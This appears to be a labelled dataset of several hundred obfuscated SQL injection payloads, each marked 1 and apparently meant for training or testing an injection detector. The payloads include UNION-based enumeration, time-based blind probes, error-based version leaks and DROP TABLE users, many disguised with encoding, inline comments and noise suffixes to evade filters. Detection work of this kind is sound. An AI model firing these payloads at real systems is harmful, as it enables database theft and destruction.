"1%u0027/**/OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020%u0020OR%u0020(1)--", 1
"1)%20UniON%20SElECt%201,dAtaBasE(),3--", 1
"; DROP %54ABLE us%65rs; %2d-%23wblo5vzuqhcizx", 1
"1%27%2F%2A%2A%2F%7C%7C%20%281%3D1%29ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20 AND 'a'='a'--", 1
"tES%54%27%2%30Or%20%271%27%%33D%27%31%27%20%2F%2A", 1
"'oR/*%0d%0A*/EXists(SeleCt1%0AFrOmusErS)--", 1
"--talzprz42fcot", 1
"1%27/*!12345*/||%20ascii(substring(database(),%201,%201))%20%3E%20100%20--", 1
"' UNION S%45LECT 1,2%2c3-%2d--4goc881b4iff0", 1
"%u0027%u0020OR%u0020%u00271%u0027%3D%u00271%u0020/*!*/AND%u00201%3D1", 1
"'/*!12345*/AND 1IN (1)1 --", 1
"; SE%4cECT pg_sleep(%35)%3b --#7284p9gvrf", 1
"%u0027%U0020uNIoN%U0020selECT%u0020nUlL,%u0020nuLl,%U0020nulL%U0020--%u0020--9gobr6shk", 1
"1'/**/A/**/ND/**/substring(database(),/**/1,/**/1)/**/%09=	/**/'s'/**/--", 1
"test%2527%2520%7C%7C%2520%281%253D1%29%25271%2527%253D%25271%2527%2520--%2520", 1
"test%27%20%4fR%20%271%27%3D%271%27%20--%20", 1
"'			AND			extractvalue(1,concat(0x5c,version()))--", 1
"'/*!*/OR EXISTS(SELECT 1 FROM users)--#nug8c", 1
"'/**/uniON sEleCT nUlL, nULL, nUlL  # more_noise--", 1
"1)			uNioN			sELECT			1,daTAbase(),3--", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version())) AND 'a'='a'--", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20%20--%20random_noise--%20", 1
"'oRExists(SELEcT1%0aFRoMUSErs) OR 'b'='b'----q53qc9f98", 1
"admin%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271/*!*//*!*/AND 1=1", 1
"%2527AND%0A1%253DCOnVert%28inT%2C%40%40vERSIon%29--", 1
"%31%%327/*%2a/OR%20a%73cii(substring(database(),%201%2c%20%31))%20%3E%201%300%20--", 1
"%u0027%u0020OR%u0020%u00271%u0027 = %u00271", 1
"1%29UN/*!*/ION%250aSELECT1%2Cdatabase%28%29%2C3--%250d%250a", 1
"1'ORIF(substring(database(),%0d%0a1,", 1
"1)='a',/*%0a*/SLEEP(5),0)--", 1
"1) UNIOn sElEcT 1,DaTABAsE(),3--", 1
"' Or ExIsts(sEleCT 1 fROm uSers)--", 1
"1/**/AND/**/1%09=	1", 1
"%27%20xOR%201%3d1%20--%20", 1
"1%u0027UNIONSELECTtable_name,%0d%0anull,%0anull%0aFROMinformation_schema.tables--#xzx9i", 1
"1%27%20UNIOn/**/SElECT/**/%74AblE_name,%20NULl,/**/n%75ll/**/froM/**/infOrmATIOn_sChE%6DA.TAbLES/**/--#6yNv%73%6d", 1
"'%20AND 1%3dcon%76er%74(int,@@version)--", 1
";DROP", 1
"TABLEusers;/*%0d%0a*/--%0d%0a", 1
"1)%20%20%20%20UniON%20%20%20%20SELEcT%20%20%20%201,dAtAbasE(),3--", 1
"1'ORIF(substring(database(),", 1
"1,1)='a',SLEEP(5),0)/*!*/AND1=1--%0a", 1
"1))/*!12345*/uNIoN selEct 1,datABaSe(),3--", 1
"'aND%0d%0a1=coNvERt(IN%74,@@VERSIoN%29%2d%2d%0a", 1
"'%20%4fR '1'='1 # more_noise", 1
"%27%20%26%26%20%281%3D1%29extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"1%27/**/AND/**/substring(d%61t%61base(),/**/%31,%201)/**/IN/**/(1)/**/'s'/**/--", 1
"1'/*!12345*/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/--", 1
"'A%4e%44%0d%0a1	= convert(%69n%74,@@version)--%0d%0a", 1
"'/**/OR/**/EXISTS(%53ELE%43T/**/1/%2a*/FR%4fM/**/us%65rs)--", 1
"1)/**/UNION/**/SELECT/**/1,database(),3%20%20#%20%20more_noise--", 1
"'       %20  OR  %20   %20   %31 =	1  %20%20      --", 1
"'UNIONSELECT1,2,3--%0d%0a", 1
"1%27%20AND%20subs%74ring(databas%65(),%201,%2%30%31)%20%3%44%%320%27s%27%20--", 1
"%u0027%u0020%u0020%u0020%u0020%u0020%u0020oR%u0020%u0020%u0020%u0020%u0020%u0020%u00271%u0027%u0020%u0020=%20%u00271", 1
"test%u002%37/*!*/OR%%750020%u00271%u002%37=%u00271%u00%327%u%30020%2f*", 1
"1' OR aScII(%73Ub%53%74rIng(DATaBASE(), %31, 1))%20> 100 ----fnn5szbr7mpi4l", 1
"1)/*!12345*/UNION%20SELECT%201,database(),3 # more_noise--", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3----imupe9ggjz6", 1
"'%09%09%09%09AND%09%09%09%091  <=%091%09%09%09%09--%09%09%09%09", 1
"te%73t'/**/OR/*%2a/'1'%3d'1'/**/--/*%2a/", 1
"%27%20AND%20%31%3D%63onvert(int,@@version)--", 1
"'/**/OR/**/'1'>='1", 1
"%%32%37%20AN%44%201%%33Dconvert%28i%6et%2C%40%40version%29%20%23%20more_noise-%2d", 1
"ad%6din'OR'1'='1/*%%30a*%2f--4vp7lu", 1
"1%2509%2509%2509%2509AND%2509%2509%2509%25091%2F%2A%2A%2F%2F%2A%2A%2F%3D%091", 1
"'%20%20%20%20UNION%20%20%20%20SELECT%20%20%20%20null,%20%20%20%20null,%20%20%20%20null%20%20%20%20--%20%20%20%20--w8xrkd2jd4c39", 1
"1' XOR substring(database(), 1, 1) LIKE 's' --", 1
"test%27OR%271%27%3D%271%27%2F%2A%250d%250a", 1
"t%65st%27%20OR%20%271%27%3D%271%27%20%2d-%20", 1
"1%27%20oR%20AsCII%28sUbStRing%28DATABaSe%28%29%2C%201%2c%201%29%29%20%3E%20100%20--", 1
"%27XOR1%3Dconvert(int,@@version)--", 1
"", 1
"%u0027%u0020%4fR%u0020%31=1%u0020--%u0020", 1
";/*!*/SELECT%20pg_sleep(5);%20--", 1
"1))%U0020uNIon%u0020SELECT%u00201,DATaBasE(),3--", 1
"'%09%09%09%09OR%09%09%09%09EXISTS(SELECT%09%09%09%091%09%09%09%09FROM%09%09%09%09users) OR 'b'='b'--", 1
"adMIN%u0027/**/oR/**/%U00271%u0027=%u00271%u0020/*!*/AnD%U00201=1", 1
"test'/**/OR '1'>='1' /*", 1
"test'/**/OR/**/'1'IN		(1)'1'/**/--/**/", 1
"1/**//**//**//**//**/AND/**//**//**//**//**/1/**/=%201--dugiss71e", 1
"' UNION SE%4c%45CT null, null, nul%6c%20--", 1
"1%u0027%u0020UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020 -- random_noise--", 1
"1) UNION S%45LECT%201,database()%2c3-%2d", 1
"'/**/UnIoN SelecT nuLl, NULL, null --", 1
";/**/SelECt pG_sleep(5); --#4YW01", 1
"W%41%49TfoR%20deLaY%20%270:%30:5%27--", 1
"%27%20or%20%271%27%3D%271%20OR%20%281%29", 1
"%3B%20DROP%20TABLE%20users%3B%20 OR (1)--", 1
"%3BDROP%250d%250aTABLEusers%3B--%2F%2A%250a%2A%2F", 1
"test'OR", 1
"'1'	=  '1'", 1
"--/*%0a*/--emdu3mdbmfyiwp", 1
"1%29%29UNION%2F%2A%250d%250a%2A%2FSELECT%0A1%2Cdatabase%28%29%2C3----tj5ob0m3dy%0A", 1
"'Or", 1
"'1'='1%0a or (1)", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)----4v01fqn83i", 1
"1AND1%20=/*%0a*/1", 1
"'/*!%3123%345%2a/UNION SELE%43T 1,2,3 -%2d random_noise--", 1
"%u0027%u0%3020U%4eI%4fN%u%30020SELECT%u00201,2,3--", 1
"%27%20%26%26%20%281%3D1%291%3C%3D1%20--%20--ec8ujyiwbqrc8", 1
";DROP%0d%0aTABLE/*%0d%0a*/users;--%0a", 1
"%27%20or%20%271%27%3d%271", 1
"%27/**/||/**/EXISTS(SE%4cECT/**/1/**/F%52OM/**/us%65rs)--", 1
"1%u0027%u0020oR%u0020aSCiI(SubsTrING(DatABase(),%u00201,%u00201))%u0020>%u0020100%u0020--", 1
"1))/*!12345*/UNION%20SELECT%201,database(),3--", 1
"'     UNION     SELECT     null,     null,     null     --     --8lr4a6mny", 1
"' AND%201IN (1)1%20--", 1
";D%52OP", 1
"TABLEusers;/*%0%64%0a*/-%2d/*%0%61*/", 1
"1%u00%327%u0020AND%u0020s%75bs%74ring(database(),%u%300201,%u00201)%u00%320=%u%30020%u0027%73%u%3002%37%u0020--", 1
"%27%2F%2A%21%2A%2FOR%20EXISTS%28SELECT%201%20FROM%20users%29/**/#/**/more_noise--", 1
"%u0027%u0020O/*!*/R%u0020%u00271%u0027<=%u00271", 1
"1%25u0027%25u0020OR%25u0020IF%28substring%28database%28%29%2C%25u00201%2C%25u00201%29%2520%253D%2520%25u0027a%25u0027%2C%25u0020SLEEP%285%29%2C%25u00200%29%25u0020--", 1
"%U0027/**/ANd%u0020EXtRaCtvaLue(1,coNCaT(0x5c,VERSiON()))--", 1
"1' OR IF(subs%74ring(%64atabase(%29%2c 1, 1)='a', SLE%45P(5),%200) --", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20%20#%20more_noise--%20", 1
"%u002%37%u0020OR%u0%3020%u00271%%750027%3D%u%300271", 1
"%u0027%U0020UniOn%U0020seLECT%U00201,2,3--", 1
"%3B%2F%2A%2A%2FSElECT%2F%2A%2A%2Fpg_sLEEP%285%29%3B%2F%2A%2A%2F--", 1
"1)UNION/*%0d%0a*/SELECT/*%0a*/1,database(),3--", 1
"", 1
"'/**/ANd/**/1=cONVert(INt,@@VErsiOn)--", 1
"1%27%20xor%20AScii(suBsTRInG(DatAbASe(),%201,%201))%20%3e%20100%20--", 1
"'AND/*%%30d%%30a*//%2a%%30a*/1I%4e (1)%09convert(int,@@version)-%2d", 1
"1'          AND          substring(database(),          1,          1)          %20=	          's'          ----3af3pbk7h3w", 1
"WAITFOR%09%09%09%09%09DELAY%09%09%09%09%09%270:0:5%27--", 1
"1) UnION seLECt 1,dAtABase(),3--", 1
"1%u0027%20OR%u0020IF(s%75bst%72i%6e%67(databa%73e(),%u00201,%u00201)IN%u0020(1)%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
"1%27%20or%20a%73cIi%28SubsTrIN%67(dAtABase(),%201,%201))%20%3E%2010%30%20--", 1
"'O%52EXISTS%28SELE%43T/*%0a*/1", 1
"FRO%4dusers)--#tv2xbfi56", 1
"1)			UN/*!12345*/ION			SELECT			1,database(),3--", 1
"admin'OR%0d%0a'1'='1/*%0d%0a*/ OR (1)", 1
"1%29%29%20UNION%20SEL%2545CT%201%2Cdataba%2573e%2528%29%252c3--", 1
"%25u0027%25u0020OR%25u00201%3D1%25u0020--%25u0020", 1
";%u0020dRoP%u002%30%54ABL%65%u00%320UseRS;%u0020--", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3 OR (1)----ji95b", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20--%23wdlmfesaq", 1
"1)) Union SeleCT 1,dAtAbAse(),3--", 1
"1%29%2F%2A%2A%2FUNION%20SELECT%201%2Cdatabase%28%29%2C3--", 1
"1%27%20%254fR%2520IF%2528s%2575bstring%28database%2528%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%2520--", 1
"%27%20aND%u00201=1%u0020--%u0020", 1
"1%2%37%20OR%20ascii(s%75%62string(database()%2c%2%30%31,%201))%20%3E%20100%20--", 1
"'%0%39%09OR%09%%3091%20%3d	1%09%09--%09%09", 1
"'OR%0a'1'  =  '1", 1
"test%u0027/**/OR%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020", 1
"'UNION/*%0a*/SELECT/*%0a*/1,2,3--", 1
"'%09OR%09'1'%09=%20'1", 1
"1'%20OR aSciI(%53ubStrIn%67(DATAbAse(), 1, 1)) > 100%20%2d---e8d70ywd08mra7c", 1
"'   AND   1 =%091   --", 1
"%25u0027%25u0020ANd%25u00201%3C%3D1%25u0020--%25u0020", 1
"'/**/UNION/**/SELECT/**/null,/**/null,/**/null/**/--/**/#qkyx7obkivoqm", 1
"%3B%2520SELect%2520pG_SLEeP%285%29%3B%2520--", 1
"1/**/AND/**/1%3D1/**/OR/**/%27b%27%3D%27b%27", 1
"1' AND substring(database(), 1, 1) = 's' ----8bwx2", 1
"1'%09%09%09%09%09Or%09%09%09%09%09iF(suBsTRING(DAtaBAse(),%09%09%09%09%091,%09%09%09%09%091)%09=/**/'A',%09%09%09%09%09Sleep(5),%09%09%09%09%090)%09%09%09%09%09--#I4OO004j8x06", 1
"1AND", 1
"1=1%0d%0a", 1
"1%29%2F%2A%2112345%2A%2FUNION%20SELECT%201%2Cdatabase%28%29%2C3%20OR%20%27b%27%3D%27b%27--#7ym0kh6zs1m", 1
"%27%20%20%20%20%20%20AND%20%20%20%20%20%201%20%3D	convert(int,@@version)--", 1
"test'OR/*%0d%0a*/'1'='1'/*%0a", 1
"test' OR '1'='1' -- #ar5sn714o", 1
"1'%4fRIF(subst%72ing(database(),/*%0%64%%30a*/1,1)='a'%2c%2f*%0d%%30a*/SLEEP(5),/*%0d%0a%2a/0)--", 1
"'			Or			ExiSTS(SeLeCt			1			FrOM			usErS)----nr7ltmsvzttbppe", 1
"' UNION %53ELECT%201,2,%33--", 1
"test'OR'1'='1'/*%0a*//* OR 'b'='b'", 1
"%27%%320%%320%20%2%30%26%26%20%20%2%30%20ext%72actvalue%281%2Cconcat%2%380x5c%2C%76ers%69on%28%29%29%29--", 1
"1And%0D%0a1<=1%0D%0A", 1
"1' aND SUbStRiNg(DAtabASe(), 1, 1) <= 'S' --#g1W8Vnel351SP3", 1
"1'/**/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  # more_noise--", 1
"tesT'%%320oR%20'%31%27lIke'1'%20/*", 1
"1))/**/UN/*!*/ION/**/SELECT/**/1,database(),3--", 1
";/**/DROP/**/TABLE/**/users;/**/--#5xwl12tw30", 1
"1' UNIon sELEcT TablE_nAme, nUlL, NULl fROm INFormAtiON_ScHEmA.tablEs  OR (1)--", 1
"1%2F%2A%2112345%2A%2FAND1%3D1%250d%250a AND 'a'='a'", 1
"test%27%2F%2A%2A%2FOR%271%27%3D%271%27%250d%250a--%2F%2A%250d%250a%2A%2F%2F%2A%250d%250a%2A%2F", 1
"%u0027/**//**//**//**//**/UnIOn/**//**//**//**//**/SeleCt/**//**//**//**//**/1,2,3--", 1
"'  uNIoN  SeLEct  nULl,  NuLL,  NuLL  --", 1
"'/**/uniON/**/SeLECt/**/NuLl,/**/NulL,/**/nULL/**/--/**/", 1
"WAITFOR %44%45LAY '0:0:5%27--", 1
"'	OR	'1'IN	(1)'1", 1
"TeSt'%09%09%09OR%09%09%09'1'/*!12345*/ =%09'1'%09%09%09%09%09%09#%09%09%09mOre_nOiSE--%09%09%09", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020#nkdzjjlo", 1
"1) UNION SELECT 1,database(),3----xnps8uqf", 1
";%u0020SelEct%U0020PG_SLeEp(5);%U0020--", 1
"' UNION SELECT 1,2,3 OR (1)----cxrw79kii3", 1
"test%u0027/*!12345*/OR%u0020%u00271%u0027<=%u00271%u0027%u0020 OR 'b'='b'--%u0020", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020        --        random_noise--%u0020", 1
"admin%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0020OR%u0020%u0027b%u0027=%u0027b%u0027", 1
"WAITFOR%20DELAY%20%270:0:5%27----hgsmyvnfa2wy", 1
"test' OR '1'=%271' /%2a", 1
"%61dmin'%2f**/OR/**/'1'=%27%31#v8m5rajx5s9n", 1
"WAITFO/*!*/R%2520DELA%59%%3252%30%25270%3A0%3A5%%32527--", 1
"' AND 1=c%6fnvert(int,%40@ve%72sion%29 OR (1)----5jxkw2p7o8", 1
"%u0027%20%20%20%20%20AND%20%20%20%20%20extractvalue(1,concat(0x5c,version()))--", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020%3E%u0020100%u0020----0arrkybznqsv", 1
"'/**/AND e%78%74ractvalue(1,%63oncat%280x%35c,version()))--", 1
"'          uNioN          seLEcT          nULL,          NuLL,          NUll          --          #26yYd", 1
"%u0027%u0020uniOn%u0020seLeCT%U00201,2,3--", 1
"admin' OR '1'='1--mu2lsn4vyeerqn", 1
"'			AND			1 =  1			--			--zhtxx97", 1
"1%27%20%20anD%20%20SubsTRing%28DAtABase%28%29%2C%20%201%2C%20%201%29%20%20%09%3D%2509%20%20%27S%27%20%20--", 1
"test%u0027%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u0020%u00271%u0027%20%3D%09%u00271%u0027%u0020%u0020%u0020%u0020/*%20AND%20%27a%27%3D%27a%27", 1
"' AND 1=1 -- #6lirenx6dy83p", 1
";%U0020seLECT%U0020pg_slEeP(5);%u0020--", 1
"1) UNION SELECT 1,da%74ab%61s%65(),%33--", 1
"WAITFO/**/R%20DELAY%20%270:0:5%27--#4pea2talw27p", 1
"%U0027/**/UNIon/**/SELEcT/**/NulL,/**/nulL,/**/nulL/**/--/**/", 1
"1%29%20uNIOn%20SeL%2545Ct%201%2Cd%2561ta%2562AsE%28%29%252C3%20Or%20%281%29--", 1
"1%27%20%20%20OR%20%20%20IF%28substring%28database%28%29%2C%20%20%201%2C%20%20%201%29%09%3D%20%27a%27%2C%20%20%20SLEEP%285%29%2C%20%20%200%29%20%20%20--", 1
"1ANd%0a1=1#6nltwhyy0f2s%0a", 1
"'AND1=1%0a--random_noise--#saqaw/*%0d%0a*/", 1
"1))/*!12345*/UNIONSELECT/*%0d%0a*/1,database(),3/*!*/AND1=1--", 1
"1))     %55NION     SE%4c%45CT     1,databas%65(),3--", 1
"1)/**/UnIon/**/sELeCT/**/1,DAtabaSe(),3 OR 'b'='b'--", 1
"1%20A/**/ND%201%3D1", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020 # more_noise--", 1
"WA%49T%46O%52%u0020DELAY%u%30020%u00270%3a0:5%u0027 AND 'a'='a%27--", 1
"1'A%4eDsubs%74ring(%64a%74abase(),1,1)%0d%0a='%73'--", 1
"1%u0027%u0020A/**/ND%u0020substring(database(),%u00201,%u00201)%u0020%3C%3D%u0020%u0027s%u0027%u0020--", 1
";sElecT", 1
"PG_sleEP(5);/*%0a*/ OR 'b'='b'--/*%0d%0a*/#9nyj460p", 1
"1%27/**/XOR/**/IF(substring%28database(%29,/**/1%2c/**/1)='a',/**/SLE%45%50(5),/**/0)/**//**/&&/**/(1=1)'a'='%61'--", 1
"tesT%27%20or%20%271%27%3D%271%27%20/*", 1
"1%20aNd%201%3D1--ppkq5q", 1
"1%20AND%201%3D1--6wo4wva%2532zzg%256ct%2536v", 1
"%27%20AND%201LIKE1%20%20#%20more_noise--%20", 1
"1%29%29%20UNION%20SELECT%201%2Cdatabase%28%29%2C3----8m8850an8csje", 1
"ADm%69%6e'oR", 1
"'1'='1%0D%0A", 1
"%u0027%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u0020EXISTS(SELECT%u0020%u0020%u0020%u00201%u0020%u0020%u0020%u0020FROM%u0020%u0020%u0020%u0020users)--", 1
"' && (1=1)1>=1 --", 1
"'UNIONSELECT", 1
"1,2,3--", 1
"", 1
"1'/*!12345*/AND substring(database(), 1, 1) <= 's'  /*!*/AND 1=1--", 1
"1%u0020A/*!12345*/ND%u00201LIKE1", 1
"1%25u0020AND%25u00201%253D1%20%2F%2A%21%2A%2FAND%201%3D1", 1
"'     OR     EXISTS(SELECT     1     FROM     users)--#m723fjtx8", 1
"'/*!12345*/UNION%20SELECT%201,2,3--", 1
";%20DRO%50%20TABLE%20use%72s;%20AND%0a'a'='a'--/*%0a*/", 1
"1%27%2F%2A%2A%2FUNION%2509%2509%2509%2509SELECT%2509%2509%2509%2509table_name%2C%2509%2509%2509%2509null%2C%2509%2509%2509%2509null%2509%2509%2509%2509FROM%2509%2509%2509%2509information_schema.tables%2509%2509%2509%2509--#0m7ae", 1
"1%2527%2520OR%2520ascii%28substring%28database%28%29%2C%25201%2C%25201%29%29%2520%253E%2520100%2520--", 1
"test%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020--y9jvtni", 1
"1%U0027%u0020o/*!*/R%u0020asCiI(SUBstRINg(DatabaSe(),%u00201,%U00201))%u0020>%U0020100%U0020--", 1
"1%27%2F%2A%2A%2FAND%2F%2A%2A%2Fsubstring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%2F%2A%2A%2F%3D%2F%2A%2A%2F%27s%27%2F%2A%2A%2F--", 1
"'/*%2a/OR/**/1=%31/**%2f%20# more_noise--/**/", 1
"1' XO%52 %61scii(subst%72ing(database(%29, 1, 1)) %3e 100%20--#uzs49fokng", 1
"'/*!*/|| exists(sELeCt 1 FROM usERS)----glvq0mwwoo", 1
"'/**/|| (1IN (1)1)'1'='1 OR (1)", 1
"' && (1=1)1LIKEconvert(int,@@version)--#gmptok3l7d", 1
"%27%2F%2A%2A%2F%4fR%2F%2A%2%41%2F%271%%327%3%44%271", 1
"%27/**/O%52%2f**/1	%3D	1/**%2f--/**/", 1
"1' OR a%73cii(substring(database()%2c %31, %31)) >%20100 --", 1
"test%27%2F%2A%2A%2FO/**/R%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F%2F%2A", 1
"aDmin'/*!*/or '1'='1", 1
"test'OR", 1
"'1'IN (1)'1'--/*%0d%0a*/#rqyojikzlv5p%0d%0a", 1
"'AND1>=convert(int,@@version)%0d%0a/*!*/AND/*%0a*/1=1--/*%0d%0a*/", 1
"%31))%20UNioN/**/se%4cect/**/1,dAtabasE(),3-%2d", 1
"1)%20UNION%20S%45LECT%20%31,d%61tabase(),3-%2d", 1
"1)) UNioN sEleCT 1,dAtABase(),3 OR (1)--", 1
"1/**/AND/**/1LIKE1--accdydcjv", 1
"1))UNIONSELECT", 1
"1,database(),3/*!*/AND%0d%0a1=1--", 1
"%27OR%2F%2A%250d%250a%2A%2FEXISTS%28SELECT%250a1FROMusers%29--", 1
"%27%09%09OR%09%091%2520%3D%25091%09%09 OR 'b'='b'--%09%09", 1
"1%2f%2A%21%2A%2fand%201%3d1", 1
"1)%u0020%u0020%u0020UN/**/ION%u0020%u0020%u0020SELECT%u0020%u0020%u00201,database(),3--", 1
"1' And suBSTri%4e%47(daTabASe(), 1%2c 1) = 'S'  OR (1)----wi%70vvj%70%6c", 1
"1%27%2F%2A%2A%2FOR%2F%2A%2A%2FIF%28substring%28database%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%3D%27a%27%2C%2F%2A%2A%2FSLEEP%285%29%2C%2F%2A%2A%2F0%29%2F%2A%2A%2F--%23nj45i1", 1
"'%20And%20eXtRACTValue(1,CONCAt(0X5C,VerSIoN()))--", 1
"1%20AND%2%301%3%441", 1
"1)				un%49oN				S%45leCT				%31,dAtAbAsE(),3-%2D And 'a'='A'", 1
"test%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3C%3D%271%27%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"WAITFOR					DELAY					'0:0:5'					OR					'b'%20=	'b'--", 1
"%27%20OR%20%271%27%3D%271#27yoyznnw", 1
"test'%09%09%09%09OR%09%09%09%09'1'%20= '1'%09%09%09%09--%09%09%09%09", 1
"test'/**/OR/**/'1%27%3d'1%27/**/--/**/", 1
"test'/**/XOR/**/'1'='1'/**/--/**/", 1
"'/*!*/|| EXISTS(SELECT 1 FROM users)--", 1
"' UNION SELECT null, null, null -- #vff3m5", 1
"'%41Nd/*%0d%0a*/1=%31/*%0a*/--", 1
"' UnIOn SElEct nuLL, Null, nuLL --", 1
"1 XOR 1=1 OR (1)--bnadw6ixxjw2", 1
"tEST' or '1'LiKE'1' /* -- random_noise--0eBKx8Bx621a", 1
"1'/**/UN/*!12345*/ION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--", 1
"TEST%27					OR					%271%27/**//**/%3D%09%271%27					/*", 1
"1%27%20%26%26%20%281%3D1%29substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20/*!12345*/OR (1)--", 1
"'/**/or          '1'lIkE'1", 1
"; %53ELECT pg%5fsleep(5); --#91gv%6al%78", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--#et8f60jqegh7zc", 1
"%2527%2520O/**/R%25201%253D1%2520--%2520", 1
"'A%4eD%%30a1>=1/*%0a*/--/*%0d%0a%2a/", 1
"1' aNd suBstRing(DAt%61baSe(), %31%2c 1)%20= %27S'  OR (1)--", 1
"tEST%u0027%U0020Or%u0020%U00271%U0027%3d%u00271%U0027%u0020--%u0020", 1
"a%64%6din'XOR%0a'1'IN(1)'%31", 1
"WAITFOR  DELAY  '0:0:5'--", 1
"test'||(1=1)'1'='1'--/*%0d%0a*//*%0d%0a*/", 1
"1%27%20%20%20%20%20%20%20%20%7C%7C%20%281%3D1%29%20%20%20%20%20%20%20IF%28substring%28database%28%29%2C%20%20%20%20%20%20%20%201%2C%20%20%20%20%20%20%20%201%29%09%3D%20%20%27a%27%2C%20%20%20%20%20%20%20%20SLEEP%285%29%2C%20%20%20%20%20%20%20%200%29%20%20%20%20%20%20%20%20--", 1
"'	OR	EXISTS(SELECT	1	FROM	users)--", 1
"TeST%27%20Or%20%271%27%3e%3D%271%27%20%2F%2a", 1
"'/**%2for '1'LIKE'%31", 1
"1)%20UN/**/ION%20SELECT%201,database(),3--", 1
"1%20&&%20(1%3D1)1%3D1", 1
";/**/SELECT%u0020pg_sleep(5);%u0020--", 1
"'/*!12345*/AND%09%09extractvalue(%31,con%63%61t(0x5%63,version())%29--", 1
"%27%20%254fR%20%27%2531%27%3D%271", 1
"1 XOR 1=1 XOR 'b'='b'", 1
"'ANDextractvalue(1,concat(0x5c,version()))OR'b'='b'--/*%0a*/", 1
"%u0027/**/AND/**/extractvalue(1,concat(0x5c,version()))--#k43k4efc2dkb", 1
"1 AN%44 1=1", 1
"'%20%20%20%20XOR%20%20%20%20EXISTS(SELECT%20%20%20%201%20%20%20%20FROM%20%20%20%20users)--#j1q3lpov6o", 1
"' U%4eION SELECT%201,2%2c3--", 1
"%3b%20DRO%50%20TAB%4cE%20users;%20--", 1
"1'      UNION      SELECT      table_name,      null,      null      FROM      information_schema.tables       # more_noise--", 1
"'UNION%0d%0aSELECT/*%0d%0a*/1,2,3--", 1
"1'%75NION/*%0%44%0%61*/SElEctTABlE_%6eaME,nuLl,N%75lLFROminf%6fRmaTion_scHema.tAB%6c%45S--", 1
"' and 1=conveRt(InT,@@VersIoN)--", 1
"'/**/Union sELeCt 1,2,3----dcL6dzQJHl", 1
"1'%09%09AND%09%09substring(database(),%09%091,%09%091)%09%09	=	%09%09's'%09%09 -- random_noise--", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020----7614zfh3", 1
"%U0027%u0%3020o%52%U00%3201<=1%u%30020--%U0020", 1
"1%27%20And%20sUBStriNg%28daTABAse%28%29%2C%201%2C%201%29%20%3d%20%27S%27%20--", 1
"%25u0027%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"1'/**/OR ascii(substring(database(), 1, 1)) > 100 ----zuehj3eksn2rina", 1
"%27%20OR%20%271%27%3D%271--7u9ocz1", 1
"1) UNION SELECT 1,database(),3--#yru0el3", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020--#6c24pk5kr", 1
"%3B%2553ELEC%2554pg_sleep%28%2535%29%3B%250a--", 1
";SELECTpg_sleep(5);", 1
"--", 1
"random_noise--/*%0a*/", 1
";SELECT%0d%0apg_sleep(5);%0a/*%0a*/--", 1
"1))%55nIOn", 1
"%53ElE%43t1,DaTaB%61se(),3--/*%0D%0A*/", 1
"admin%25u0027%2F%2A%21%2A%2FOR%25u0020%25u00271%25u0027%3D%25u00271", 1
"1%25u0027%25u0020%7C%7C%25u0020ascii%28substring%28database%28%29%2C%25u00201%2C%25u00201%29%29%25u0020%3E%25u0020100%25u0020--", 1
"WAITFOR%2509%2509%2509%2509%2509DELAY%2509%2509%2509%2509%2509%270%3A0%3A5%27 AND 'a'='a'--", 1
"; SELECT pg_sleep(5); ----rabmogwequ4kvep", 1
"%27%20OR%20EXIST%53%28%53EL/*!*/EC%54%20%31%20FRO%4d%20users%29--", 1
"%27%u0020U%4eION%u0020SELECT%u0020null,%u0020nul%6c,%20null%u0020--%u0020", 1
"' AND 1=1  -- random_noise--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20----kw97g7jc0qtf", 1
"admin%27/*!%312345%2a/OR%20%271%27%3D%271", 1
"test%u0027%u0020OR%u0020%271%u0027=%271%u0027%u0020/*%u0020--%u0020random_noise", 1
"' OR '1'='1--up7v1ds45uui7", 1
"%u0027/**/AND%u00201LIKEconvert(int,@@version)--", 1
"' OR %45XISTS%28SELECT 1 FROM users%29-%2d--c7tti", 1
"1 xoR 1=1 /*!*/AND 1=1", 1
"t%2565st%27%20OR%20%25271%27%3D%271%27%20%2F%2A", 1
"%27%20A%4eD%201%3D%31%20--%20", 1
